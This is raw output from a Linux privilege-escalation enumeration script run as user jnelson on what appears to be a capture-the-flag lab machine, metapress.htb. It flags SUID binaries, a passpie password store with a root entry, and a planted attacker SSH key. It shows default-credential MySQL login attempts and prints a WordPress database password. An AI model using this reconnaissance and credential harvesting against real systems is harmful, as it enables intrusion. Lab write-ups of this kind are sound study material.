╔══════════╣ Last time logon each user
Username         Port     From             Latest                                                                                                                                          
root             tty1                      Tue Oct 25 11:13:33 +0100 2022
jnelson          pts/1    10.10.14.119     Fri Mar 15 17:58:59 +0000 2024

╔══════════╣ Do not forget to test 'su' as any other user with shell: without password and with their names as password (I don't do it in FAST mode...)
                                                                                                                                                                                           
╔══════════╣ Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
                                                                                                                                                                                           


 95  840k   95  800k    0     0   8575      0  0:01:40  0:01:35  0:00:05  8575                             ╔══════════════════════╗
═════════════════════════════╣ Software Information ╠═════════════════════════════                                                                                                         
                             ╚══════════════════════╝                                                                                                                                      
╔══════════╣ Useful software
/usr/bin/base64                                                                                                                                                                            
/usr/bin/curl
/usr/bin/perl
/usr/bin/php
/usr/bin/ping
/usr/bin/python2.7
/usr/bin/python3
/usr/bin/socat
/usr/bin/sudo
/usr/bin/wget

╔══════════╣ Installed Compilers
                                                                                                                                                                                           
╔══════════╣ MySQL version
mysql  Ver 15.1 Distrib 10.5.15-MariaDB, for debian-linux-gnu (x86_64) using  EditLine wrapper                                                                                             


═╣ MySQL connection using default root/root ........... No
═╣ MySQL connection using root/toor ................... No                                                                                                                                 
═╣ MySQL connection using root/NOPASS ................. No                                                                                                                                 
                                                                                                                                                                                           
╔══════════╣ Searching mysql credentials and exec
From '/etc/mysql/mariadb.conf.d/50-server.cnf' Mysql user: user                    = mysql                                                                                                 
Found readable /etc/mysql/my.cnf
[client-server]
socket = /run/mysqld/mysqld.sock
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

╔══════════╣ Analyzing MariaDB Files (limit 70)
-rw-r--r-- 1 root root 1126 Feb 18  2022 /etc/mysql/mariadb.cnf                                                                                                                            
[client-server]
socket = /run/mysqld/mysqld.sock
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

-rw------- 1 root root 544 Jun 26  2022 /etc/mysql/debian.cnf

╔══════════╣ Analyzing Apache-Nginx Files (limit 70)
Apache version: Server version: Apache/2.4.54 (Debian)                                                                                                                                     
Server built:   2022-06-09T04:26:43
httpd Not Found
                                                                                                                                                                                           
Nginx version: 
══╣ Nginx modules
ngx_http_geoip_module.so                                                                                                                                                                   
ngx_http_image_filter_module.so
ngx_http_xslt_filter_module.so
ngx_mail_module.so
ngx_stream_geoip_module.so
ngx_stream_module.so
══╣ PHP exec extensions
drwxr-xr-x 2 root root 4096 Oct  4  2022 /etc/nginx/sites-enabled                                                                                                                          
drwxr-xr-x 2 root root 4096 Oct  4  2022 /etc/nginx/sites-enabled
lrwxrwxrwx 1 root root 34 Oct  4  2022 /etc/nginx/sites-enabled/default -> /etc/nginx/sites-available/default
server {
 listen 80;
 listen [::]:80;
 root /var/www/metapress.htb/blog;
 index index.php index.html;
        if ($http_host != "metapress.htb") {
                rewrite ^ http://metapress.htb/;
        }
 location / {
  try_files $uri $uri/ /index.php?$args;
 }
    
 location ~ \.php$ {
  include snippets/fastcgi-php.conf;
  fastcgi_pass unix:/var/run/php/php8.0-fpm.sock;
 }
 location ~* \.(js|css|png|jpg|jpeg|gif|ico|svg)$ {
  expires max;
  log_not_found off;
 }
}



-rw-r--r-- 1 root root 73912 Jun 26  2022 /etc/php/8.0/apache2/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
allow_url_include = 0
-rw-r--r-- 1 root root 72546 Jun 25  2022 /etc/php/8.0/cli/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On
-rw-r--r-- 1 root root 72947 Oct 25  2022 /etc/php/8.0/fpm/php.ini
allow_url_fopen = On
allow_url_include = Off
odbc.allow_persistent = On
mysqli.allow_persistent = On
pgsql.allow_persistent = On

-rw-r--r-- 1 root root 1447 May 29  2021 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
 worker_connections 768;
}
http {
 sendfile on;
 tcp_nopush on;
 types_hash_max_size 2048;
 include /etc/nginx/mime.types;
 default_type application/octet-stream;
 ssl_prefer_server_ciphers on;
 access_log /var/log/nginx/access.log;
 error_log /var/log/nginx/error.log;
 gzip on;
 include /etc/nginx/conf.d/*.conf;
 include /etc/nginx/sites-enabled/*;
}

-rw-r--r-- 1 root root 389 May 29  2021 /etc/default/nginx

-rwxr-xr-x 1 root root 4579 May 29  2021 /etc/init.d/nginx

-rw-r--r-- 1 root root 329 May 29  2021 /etc/logrotate.d/nginx

drwxr-xr-x 8 root root 4096 Oct  4  2022 /etc/nginx
lrwxrwxrwx 1 root root 54 Oct  4  2022 /etc/nginx/modules-enabled/50-mod-http-geoip.conf -> /usr/share/nginx/modules-available/mod-http-geoip.conf
load_module modules/ngx_http_geoip_module.so;
lrwxrwxrwx 1 root root 60 Oct  4  2022 /etc/nginx/modules-enabled/50-mod-http-xslt-filter.conf -> /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
lrwxrwxrwx 1 root root 56 Oct  4  2022 /etc/nginx/modules-enabled/70-mod-stream-geoip.conf -> /usr/share/nginx/modules-available/mod-stream-geoip.conf
load_module modules/ngx_stream_geoip_module.so;
lrwxrwxrwx 1 root root 48 Oct  4  2022 /etc/nginx/modules-enabled/50-mod-mail.conf -> /usr/share/nginx/modules-available/mod-mail.conf
load_module modules/ngx_mail_module.so;
lrwxrwxrwx 1 root root 61 Oct  4  2022 /etc/nginx/modules-enabled/50-mod-http-image-filter.conf -> /usr/share/nginx/modules-available/mod-http-image-filter.conf
load_module modules/ngx_http_image_filter_module.so;
lrwxrwxrwx 1 root root 50 Oct  4  2022 /etc/nginx/modules-enabled/50-mod-stream.conf -> /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
-rw-r--r-- 1 root root 217 May 29  2021 /etc/nginx/snippets/snakeoil.conf
ssl_certificate /etc/ssl/certs/ssl-cert-snakeoil.pem;
ssl_certificate_key /etc/ssl/private/ssl-cert-snakeoil.key;
-rw-r--r-- 1 root root 423 May 29  2021 /etc/nginx/snippets/fastcgi-php.conf
fastcgi_split_path_info ^(.+?\.php)(/.*)$;
try_files $fastcgi_script_name =404;
set $path_info $fastcgi_path_info;
fastcgi_param PATH_INFO $path_info;
fastcgi_index index.php;
include fastcgi.conf;
-rw-r--r-- 1 root root 1125 May 29  2021 /etc/nginx/fastcgi.conf
fastcgi_param  SCRIPT_FILENAME    $document_root$fastcgi_script_name;
fastcgi_param  QUERY_STRING       $query_string;
fastcgi_param  REQUEST_METHOD     $request_method;
fastcgi_param  CONTENT_TYPE       $content_type;
fastcgi_param  CONTENT_LENGTH     $content_length;
fastcgi_param  SCRIPT_NAME        $fastcgi_script_name;
fastcgi_param  REQUEST_URI        $request_uri;
fastcgi_param  DOCUMENT_URI       $document_uri;
fastcgi_param  DOCUMENT_ROOT      $document_root;
fastcgi_param  SERVER_PROTOCOL    $server_protocol;
fastcgi_param  REQUEST_SCHEME     $scheme;
fastcgi_param  HTTPS              $https if_not_empty;
fastcgi_param  GATEWAY_INTERFACE  CGI/1.1;
fastcgi_param  SERVER_SOFTWARE    nginx/$nginx_version;
fastcgi_param  REMOTE_ADDR        $remote_addr;
fastcgi_param  REMOTE_PORT        $remote_port;
fastcgi_param  REMOTE_USER        $remote_user;
fastcgi_param  SERVER_ADDR        $server_addr;
fastcgi_param  SERVER_PORT        $server_port;
fastcgi_param  SERVER_NAME        $server_name;
fastcgi_param  REDIRECT_STATUS    200;
-rw-r--r-- 1 root root 1447 May 29  2021 /etc/nginx/nginx.conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;
events {
 worker_connections 768;
}
http {
 sendfile on;
 tcp_nopush on;
 types_hash_max_size 2048;
 include /etc/nginx/mime.types;
 default_type application/octet-stream;
 ssl_prefer_server_ciphers on;
 access_log /var/log/nginx/access.log;
 error_log /var/log/nginx/error.log;
 gzip on;
 include /etc/nginx/conf.d/*.conf;
 include /etc/nginx/sites-enabled/*;
}

-rw-r--r-- 1 root root 374 May 29  2021 /etc/ufw/applications.d/nginx

drwxr-xr-x 3 root root 4096 Oct  4  2022 /usr/lib/nginx

-rwxr-xr-x 1 root root 1190896 May 14  2022 /usr/sbin/nginx

drwxr-xr-x 2 root root 4096 Oct  4  2022 /usr/share/doc/nginx

drwxr-xr-x 4 root root 4096 Oct  4  2022 /usr/share/nginx
-rw-r--r-- 1 root root 40 May 14  2022 /usr/share/nginx/modules-available/mod-mail.conf
load_module modules/ngx_mail_module.so;
-rw-r--r-- 1 root root 42 May 14  2022 /usr/share/nginx/modules-available/mod-stream.conf
load_module modules/ngx_stream_module.so;
-rw-r--r-- 1 root root 46 May 14  2022 /usr/share/nginx/modules-available/mod-http-geoip.conf
load_module modules/ngx_http_geoip_module.so;
-rw-r--r-- 1 root root 53 May 14  2022 /usr/share/nginx/modules-available/mod-http-image-filter.conf
load_module modules/ngx_http_image_filter_module.so;
-rw-r--r-- 1 root root 52 May 14  2022 /usr/share/nginx/modules-available/mod-http-xslt-filter.conf
load_module modules/ngx_http_xslt_filter_module.so;
-rw-r--r-- 1 root root 48 May 14  2022 /usr/share/nginx/modules-available/mod-stream-geoip.conf
load_module modules/ngx_stream_geoip_module.so;

drwxr-xr-x 7 root root 4096 Oct  5  2022 /var/lib/nginx
find: ‘/var/lib/nginx/scgi’: Permission denied
find: ‘/var/lib/nginx/body’: Permission denied
find: ‘/var/lib/nginx/fastcgi’: Permission denied
find: ‘/var/lib/nginx/uwsgi’: Permission denied
find: ‘/var/lib/nginx/proxy’: Permission denied

drwxr-xr-x 2 root adm 4096 Mar 15 14:44 /var/log/nginx


╔══════════╣ Analyzing FastCGI Files (limit 70)
-rw-r--r-- 1 root root 1055 May 29  2021 /etc/nginx/fastcgi_params                                                                                                                         

╔══════════╣ Analyzing Wordpress Files (limit 70)
-rw-r--r-- 1 www-data www-data 2032 Jun 23  2022 /var/www/metapress.htb/blog/wp-config.php                                                                                                 
define( 'DB_NAME', 'blog' );
define( 'DB_USER', 'blog' );
define( 'DB_PASSWORD', '635Aq@TdqrCwXFUZ' );
define( 'DB_HOST', 'localhost' );
define( 'FTP_USER', 'metapress.htb' );
define( 'FTP_HOST', 'ftp.metapress.htb' );

╔══════════╣ Analyzing Rsync Files (limit 70)
-rw-r--r-- 1 root root 1044 Sep 18  2021 /usr/share/doc/rsync/examples/rsyncd.conf                                                                                                         
[ftp]
 comment = public archive
 path = /var/www/pub
 use chroot = yes
 lock file = /var/lock/rsyncd
 read only = yes
 list = yes
 uid = nobody
 gid = nogroup
 strict modes = yes
 ignore errors = no
 ignore nonreadable = yes
 transfer logging = no
 timeout = 600
 refuse options = checksum dry-run
 dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz


╔══════════╣ Analyzing Ldap Files (limit 70)
The password hash is from the {SSHA} to 'structural'                                                                                                                                       
drwxr-xr-x 2 root root 4096 Oct  5  2022 /etc/ldap


╔══════════╣ Searching ssl/ssh files
╔══════════╣ Analyzing SSH Files (limit 70)                                                                                                                                                
                                                                                                                                                                                           



-rw-r--r-- 1 jnelson jnelson 113 Mar 15 17:58 /home/jnelson/.ssh/authorized_keys
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIErzi80YYVjGdDF0K4f29cvtK3MTLy87WUNOXr6W5U3Y parallels@kali-gnu-linux-2023.2

-rw-r--r-- 1 root root 172 Jun 26  2022 /etc/ssh/ssh_host_ecdsa_key.pub
-rw-r--r-- 1 root root 92 Jun 26  2022 /etc/ssh/ssh_host_ed25519_key.pub
-rw-r--r-- 1 root root 564 Jun 26  2022 /etc/ssh/ssh_host_rsa_key.pub

ChallengeResponseAuthentication no
UsePAM yes
PermitRootLogin no
PasswordAuthentication yes
PermitEmptyPasswords no
ChallengeResponseAuthentication no

══╣ Possible private SSH keys were found!
/home/jnelson/.passpie/.keys

══╣ Some certificates were found (out limited):
/etc/ssl/certs/ACCVRAIZ1.pem                                                                                                                                                               
/etc/ssl/certs/AC_RAIZ_FNMT-RCM.pem
/etc/ssl/certs/Actalis_Authentication_Root_CA.pem
/etc/ssl/certs/AffirmTrust_Commercial.pem
/etc/ssl/certs/AffirmTrust_Networking.pem
/etc/ssl/certs/AffirmTrust_Premium_ECC.pem
/etc/ssl/certs/AffirmTrust_Premium.pem
/etc/ssl/certs/Amazon_Root_CA_1.pem
/etc/ssl/certs/Amazon_Root_CA_2.pem
/etc/ssl/certs/Amazon_Root_CA_3.pem
/etc/ssl/certs/Amazon_Root_CA_4.pem
/etc/ssl/certs/Atos_TrustedRoot_2011.pem
/etc/ssl/certs/Autoridad_de_Certificacion_Firmaprofesional_CIF_A62634068.pem
/etc/ssl/certs/Baltimore_CyberTrust_Root.pem
/etc/ssl/certs/Buypass_Class_2_Root_CA.pem
/etc/ssl/certs/Buypass_Class_3_Root_CA.pem
/etc/ssl/certs/ca-certificates.crt
/etc/ssl/certs/CA_Disig_Root_R2.pem
/etc/ssl/certs/Certigna.pem
/etc/ssl/certs/Certigna_Root_CA.pem
4572PSTORAGE_CERTSBIN

══╣ Writable ssh and gpg agents
/etc/systemd/user/sockets.target.wants/gpg-agent-ssh.socket                                                                                                                                
/etc/systemd/user/sockets.target.wants/gpg-agent-browser.socket
/etc/systemd/user/sockets.target.wants/gpg-agent.socket
/etc/systemd/user/sockets.target.wants/gpg-agent-extra.socket
══╣ Some home ssh config file was found
/usr/share/openssh/sshd_config                                                                                                                                                             
Include /etc/ssh/sshd_config.d/*.conf
ChallengeResponseAuthentication no
UsePAM yes
X11Forwarding yes
PrintMotd no
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server

══╣ /etc/hosts.allow file found, trying to read the rules:
/etc/hosts.allow                                                                                                                                                                           


Searching inside /etc/ssh/ssh_config for interesting info
Include /etc/ssh/ssh_config.d/*.conf
Host *
    SendEnv LANG LC_*
    HashKnownHosts yes
    GSSAPIAuthentication yes

╔══════════╣ Analyzing PAM Auth Files (limit 70)
drwxr-xr-x 2 root root 4096 Oct  5  2022 /etc/pam.d                                                                                                                                        
-rw-r--r-- 1 root root 2133 Mar 13  2021 /etc/pam.d/sshd
account    required     pam_nologin.so
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so close
session    required     pam_loginuid.so
session    optional     pam_keyinit.so force revoke
session    optional     pam_motd.so  motd=/run/motd.dynamic
session    optional     pam_motd.so noupdate
session    optional     pam_mail.so standard noenv # [1]
session    required     pam_limits.so
session    required     pam_env.so # [1]
session    required     pam_env.so user_readenv=1 envfile=/etc/default/locale
session [success=ok ignore=ignore module_unknown=ignore default=bad]        pam_selinux.so open




╔══════════╣ Analyzing Keyring Files (limit 70)
drwxr-xr-x 2 root root 4096 Jun 26  2022 /usr/share/keyrings                                                                                                                               




╔══════════╣ Searching uncommon passwd files (splunk)
passwd file: /etc/pam.d/passwd                                                                                                                                                             
passwd file: /etc/passwd
passwd file: /usr/share/lintian/overrides/passwd

╔══════════╣ Analyzing PGP-GPG Files (limit 70)
/usr/bin/gpg                                                                                                                                                                               
netpgpkeys Not Found
netpgp Not Found                                                                                                                                                                           
                                                                                                                                                                                           
-rw-r--r-- 1 root root 8700 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-automatic.gpg
-rw-r--r-- 1 root root 8709 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-security-automatic.gpg
-rw-r--r-- 1 root root 2453 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-bullseye-stable.gpg
-rw-r--r-- 1 root root 8132 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 7443 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 Feb 25  2021 /etc/apt/trusted.gpg.d/debian-archive-stretch-stable.gpg
-rw-r--r-- 1 root root 1769 Feb 16  2021 /etc/apt/trusted.gpg.d/php.gpg
-rw-r--r-- 1 root root 2899 Jul  1  2022 /usr/share/gnupg/distsigkey.gpg
-rw-r--r-- 1 root root 8700 Feb 25  2021 /usr/share/keyrings/debian-archive-bullseye-automatic.gpg
-rw-r--r-- 1 root root 8709 Feb 25  2021 /usr/share/keyrings/debian-archive-bullseye-security-automatic.gpg
-rw-r--r-- 1 root root 2453 Feb 25  2021 /usr/share/keyrings/debian-archive-bullseye-stable.gpg
-rw-r--r-- 1 root root 8132 Feb 25  2021 /usr/share/keyrings/debian-archive-buster-automatic.gpg
-rw-r--r-- 1 root root 8141 Feb 25  2021 /usr/share/keyrings/debian-archive-buster-security-automatic.gpg
-rw-r--r-- 1 root root 2332 Feb 25  2021 /usr/share/keyrings/debian-archive-buster-stable.gpg
-rw-r--r-- 1 root root 55625 Feb 25  2021 /usr/share/keyrings/debian-archive-keyring.gpg
-rw-r--r-- 1 root root 36873 Feb 25  2021 /usr/share/keyrings/debian-archive-removed-keys.gpg
-rw-r--r-- 1 root root 7443 Feb 25  2021 /usr/share/keyrings/debian-archive-stretch-automatic.gpg
-rw-r--r-- 1 root root 7452 Feb 25  2021 /usr/share/keyrings/debian-archive-stretch-security-automatic.gpg
-rw-r--r-- 1 root root 2263 Feb 25  2021 /usr/share/keyrings/debian-archive-stretch-stable.gpg



╔══════════╣ Analyzing FTP Files (limit 70)
                                                                                                                                                                                           


-rw-r--r-- 1 root root 69 Jun 25  2022 /etc/php/8.0/mods-available/ftp.ini
-rw-r--r-- 1 root root 69 Sep 29  2022 /usr/share/php8.0-common/common/ftp.ini






╔══════════╣ Analyzing Interesting logs Files (limit 70)
-rw-r----- 1 www-data adm 168608 Mar 15 18:02 /var/log/nginx/access.log                                                                                                                    

-rw-r--r-- 1 root root 9245527 Mar 15 17:10 /var/log/nginx/error.log

╔══════════╣ Analyzing Windows Files (limit 70)
                                                                                                                                                                                           





















lrwxrwxrwx 1 root root 22 Jun 26  2022 /etc/alternatives/my.cnf -> /etc/mysql/mariadb.cnf
lrwxrwxrwx 1 root root 24 Jun 26  2022 /etc/mysql/my.cnf -> /etc/alternatives/my.cnf
-rw-r--r-- 1 root root 83 Jun 26  2022 /var/lib/dpkg/alternatives/my.cnf





























╔══════════╣ Analyzing Other Interesting Files (limit 70)
-rw-r--r-- 1 root root 3526 Aug  4  2021 /etc/skel/.bashrc                                                                                                                                 
-rw-r--r-- 1 jnelson jnelson 3526 Jun 26  2022 /home/jnelson/.bashrc





-rw-r--r-- 1 root root 807 Aug  4  2021 /etc/skel/.profile
-rw-r--r-- 1 jnelson jnelson 807 Jun 26  2022 /home/jnelson/.profile






100  840k  100  840k    0     0   8913      0  0:01:36  0:01:36 --:--:--  6899
                      ╔════════════════════════════════════╗
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                                                                                         
                      ╚════════════════════════════════════╝                                                                                                                               
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                           
strings Not Found                                                                                                                                                                          
strace Not Found                                                                                                                                                                           
-rwsr-xr-x 1 root root 55K Jan 20  2022 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8                                                                
-rwsr-xr-x 1 root root 58K Feb  7  2020 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 44K Feb  7  2020 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 52K Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 179K Feb 27  2021 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 35K Jan 20  2022 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-xr-x 1 root root 35K Feb 26  2021 /usr/bin/fusermount
-rwsr-xr-x 1 root root 87K Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 71K Jan 20  2022 /usr/bin/su
-rwsr-xr-x 1 root root 63K Feb  7  2020 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 471K Jul  1  2022 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 51K Oct  5  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

╔══════════╣ SGID
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                                                                           
-rwxr-sr-x 1 root shadow 38K Aug 26  2021 /usr/sbin/unix_chkpwd                                                                                                                            
-rwxr-sr-x 1 root tty 35K Jan 20  2022 /usr/bin/wall
-rwxr-sr-x 1 root shadow 31K Feb  7  2020 /usr/bin/expiry
-rwxr-sr-x 1 root crontab 43K Feb 22  2021 /usr/bin/crontab
-rwxr-sr-x 1 root ssh 347K Jul  1  2022 /usr/bin/ssh-agent
-rwxr-sr-x 1 root shadow 79K Feb  7  2020 /usr/bin/chage

╔══════════╣ Checking misconfigurations of ld.so
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#ld.so                                                                                                                   
/etc/ld.so.conf                                                                                                                                                                            
Content of /etc/ld.so.conf:                                                                                                                                                                
include /etc/ld.so.conf.d/*.conf

/etc/ld.so.conf.d
  /etc/ld.so.conf.d/libc.conf                                                                                                                                                              
  - /usr/local/lib                                                                                                                                                                         
  /etc/ld.so.conf.d/x86_64-linux-gnu.conf
  - /usr/local/lib/x86_64-linux-gnu                                                                                                                                                        
  - /lib/x86_64-linux-gnu
  - /usr/lib/x86_64-linux-gnu

/etc/ld.so.preload
╔══════════╣ Capabilities                                                                                                                                                                  
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#capabilities                                                                                                            
══╣ Current shell capabilities                                                                                                                                                             
CapInh:  0x0000000000000000=                                                                                                                                                               
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:  0x0000000000000000=

══╣ Parent process capabilities
CapInh:  0x0000000000000000=                                                                                                                                                               
CapPrm:  0x0000000000000000=
CapEff:  0x0000000000000000=
CapBnd:  0x000001ffffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,cap_perfmon,cap_bpf,cap_checkpoint_restore
CapAmb:  0x0000000000000000=


Files with capabilities (limited to 50):
/usr/bin/ping cap_net_raw=ep

╔══════════╣ AppArmor binary profiles
-rw-r--r-- 1 root root  730 Feb 20  2022 usr.sbin.mariadbd                                                                                                                                 

╔══════════╣ Files with ACLs (limited to 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#acls                                                                                                                    
files with acls in searched folders Not Found                                                                                                                                              
                                                                                                                                                                                           
╔══════════╣ Files (scripts) in /etc/profile.d/
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#profiles-files                                                                                                          
total 16                                                                                                                                                                                   
drwxr-xr-x  2 root root 4096 Jun 26  2022 .
drwxr-xr-x 76 root root 4096 Mar 15 18:09 ..
-rw-r--r--  1 root root 1107 Feb 10  2021 gawk.csh
-rw-r--r--  1 root root  757 Feb 10  2021 gawk.sh

╔══════════╣ Permissions in init, init.d, systemd, and rc.d
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#init-init-d-systemd-and-rc-d                                                                                            
                                                                                                                                                                                           
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ No                                                                                                                                               
═╣ Credentials in fstab/mtab? ........... No                                                                                                                                               
═╣ Can I read shadow files? ............. No                                                                                                                                               
═╣ Can I read shadow plists? ............ No                                                                                                                                               
═╣ Can I write shadow plists? ........... No                                                                                                                                               
═╣ Can I read opasswd file? ............. No                                                                                                                                               
═╣ Can I write in network-scripts? ...... No                                                                                                                                               
═╣ Can I read root folder? .............. No                                                                                                                                               
                                                                                                                                                                                           
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                                     
/home/jnelson/user.txt
/home/jnelson/.bash_history
/root/
/var/www
/var/www/metapress.htb

╔══════════╣ Searching folders owned by me containing others files on it (limit 100)
-rw-r----- 1 root jnelson 33 Mar 15 14:44 /home/jnelson/user.txt                                                                                                                           

╔══════════╣ Readable files belonging to root and readable by me but not world readable
-rw-r----- 1 root jnelson 33 Mar 15 14:44 /home/jnelson/user.txt                                                                                                                           

╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                          
/dev/mqueue                                                                                                                                                                                
/dev/shm
/home/jnelson
/run/lock
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/run/user/1000/systemd/inaccessible
/run/user/1000/systemd/inaccessible/dir
/run/user/1000/systemd/inaccessible/reg
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/.X11-unix
/tmp/.XIM-unix
/var/lib/php/sessions
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                          
                                                                                                                                                                                           


                            ╔═════════════════════════╗
════════════════════════════╣ Other Interesting Files ╠════════════════════════════                                                                                                        
                            ╚═════════════════════════╝                                                                                                                                    
╔══════════╣ .sh files in path
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#script-binaries-in-path                                                                                                 
/usr/bin/gettext.sh                                                                                                                                                                        

╔══════════╣ Executable files potentially added by user (limit 70)
2022-10-25+12:52:06.5009076700 /home/jnelson/.passpie/ssh/jnelson.pass                                                                                                                     
2022-10-25+12:52:06.4969076700 /home/jnelson/.passpie/ssh/root.pass
2022-10-03+13:52:29.8046513600 /etc/console-setup/cached_setup_terminal.sh
2022-10-03+13:52:29.8046513600 /etc/console-setup/cached_setup_keyboard.sh
2022-10-03+13:52:29.8046513600 /etc/console-setup/cached_setup_font.sh
2022-06-26+15:59:08.0960021340 /usr/local/bin/wp
2022-06-26+15:59:00.3040021030 /usr/local/bin/passpie
2022-06-26+15:59:00.1280021030 /usr/local/bin/tabulate
2022-06-26+15:58:56.1720020870 /usr/local/bin/wheel
2022-06-26+15:58:56.1120020870 /usr/local/bin/easy_install-2.7
2022-06-26+15:58:56.1120020870 /usr/local/bin/easy_install
2022-06-26+15:58:55.8680020860 /usr/local/bin/pip2.7
2022-06-26+15:58:55.8680020860 /usr/local/bin/pip2
2022-06-26+15:58:55.8680020860 /usr/local/bin/pip

╔══════════╣ Unexpected in root
/initrd.img.old                                                                                                                                                                            
/initrd.img
/vmlinuz
/vmlinuz.old
/.bash_history

╔══════════╣ Modified interesting files in the last 5mins (limit 100)
/var/log/auth.log                                                                                                                                                                          
/var/log/daemon.log
/var/log/syslog
/var/log/journal/f70af50882144373ae213f10b93514fa/user-1000.journal
/var/log/journal/f70af50882144373ae213f10b93514fa/system.journal
/etc/resolv.conf
/home/jnelson/.gnupg/pubring.kbx
/home/jnelson/.gnupg/trustdb.gpg

╔══════════╣ Writable log files (logrotten) (limit 50)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#logrotate-exploitation                                                                                                  
logrotate 3.18.0                                                                                                                                                                           

    Default mail command:       /usr/bin/mail
    Default compress command:   /bin/gzip
    Default uncompress command: /bin/gunzip
    Default compress extension: .gz
    Default state file path:    /var/lib/logrotate/status
    ACL support:                yes
    SELinux support:            yes

╔══════════╣ Files inside /home/jnelson (limit 20)
total 40                                                                                                                                                                                   
drwxr-xr-x 6 jnelson jnelson 4096 Mar 15 18:10 .
drwxr-xr-x 3 root    root    4096 Oct  5  2022 ..
lrwxrwxrwx 1 root    root       9 Jun 26  2022 .bash_history -> /dev/null
-rw-r--r-- 1 jnelson jnelson  220 Jun 26  2022 .bash_logout
